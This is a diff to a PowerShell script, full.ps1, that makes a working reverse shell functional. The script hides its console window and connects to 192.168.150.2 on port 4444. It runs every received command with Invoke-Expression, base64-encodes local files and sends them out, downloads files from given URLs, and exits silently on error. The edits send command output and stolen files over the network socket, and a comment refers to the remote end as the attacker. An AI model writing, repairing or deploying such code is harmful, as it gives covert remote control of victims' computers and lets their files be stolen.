@@ -1,4 +1,4 @@
-# full.ps1 - Complete version with file transfer
+# full.ps1 - Fixed version with proper network output
 $ip = "192.168.150.2"
 $port = 4444
 
@@ -8,10 +8,10 @@ Add-Type -MemberDefinition @"
 public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);
 [DllImport("kernel32.dll")]
 public static extern IntPtr GetConsoleWindow();
-"@ -Namespace Win32Functions -Name NativeMethods
+"@ -Namespace Win32Functions -Name NativeMethods -ErrorAction SilentlyContinue
 
-$consoleWindow = [Win32Functions.NativeMethods]::GetConsoleWindow()
-[Win32Functions.NativeMethods]::ShowWindowAsync($consoleWindow, 0)
+$consoleWindow = [Win32Functions.NativeMethods]::GetConsoleWindow() -ErrorAction SilentlyContinue
+[Win32Functions.NativeMethods]::ShowWindowAsync($consoleWindow, 0) -ErrorAction SilentlyContinue
 
 # File transfer function
 function Send-File {
@@ -22,12 +22,14 @@ function Send-File {
         $b64 = [Convert]::ToBase64String($bytes)
         $fileName = Split-Path $filePath -Leaf
         
-        Write-Host "FILE_START|$fileName|$($bytes.Length)"
-        Write-Host $b64
-        Write-Host "FILE_END"
+        # Send to network, not local console
+        $writer.WriteLine("FILE_START|$fileName|$($bytes.Length)")
+        $writer.WriteLine($b64)
+        $writer.WriteLine("FILE_END")
     } else {
-        Write-Host "ERROR|File not found: $filePath"
+        $writer.WriteLine("ERROR|File not found: $filePath")
     }
+    $writer.Flush()
 }
 
 # Main loop
@@ -36,12 +38,14 @@ try {
     $stream = $client.GetStream()
     $reader = New-Object System.IO.StreamReader($stream)
     $writer = New-Object System.IO.StreamWriter($stream)
+    $writer.AutoFlush = $true  # CRITICAL: sends data immediately
     
     # Send ready message
     $writer.WriteLine("[+] Connected to $ip")
-    $writer.Flush()
     
     while (($line = $reader.ReadLine()) -ne $null) {
+        $line = $line.Trim()
+        
         # Check for download command
         if ($line -match "^download (.+)$") {
             $filePath = $matches[1]
@@ -54,30 +58,27 @@ try {
             try {
                 $wc = New-Object System.Net.WebClient
                 $wc.DownloadFile($url, $dest)
-                Write-Host "SUCCESS|Downloaded to $dest"
+                $writer.WriteLine("SUCCESS|Downloaded to $dest")
             } catch {
-                Write-Host "ERROR|$($_.Exception.Message)"
+                $writer.WriteLine("ERROR|$($_.Exception.Message)")
             }
         }
         # Normal command execution
         else {
             try {
-                $output = iex $line 2>&1 | Out-String
+                $output = Invoke-Expression $line 2>&1 | Out-String
                 if ($output) {
-                    Write-Host $output
+                    $writer.WriteLine($output)
                 } else {
-                    Write-Host "Command executed (no output)"
+                    $writer.WriteLine("[+] Command executed (no output)")
                 }
             } catch {
-                Write-Host "ERROR: $($_.Exception.Message)"
+                $writer.WriteLine("ERROR: $($_.Exception.Message)")
             }
         }
-        
-        # Send output back to attacker
-        if ($writer.BaseStream.CanWrite) {
-            $writer.Flush()
-        }
+        $writer.Flush()
     }
 } catch {
     # Silent fail
+    exit
 }
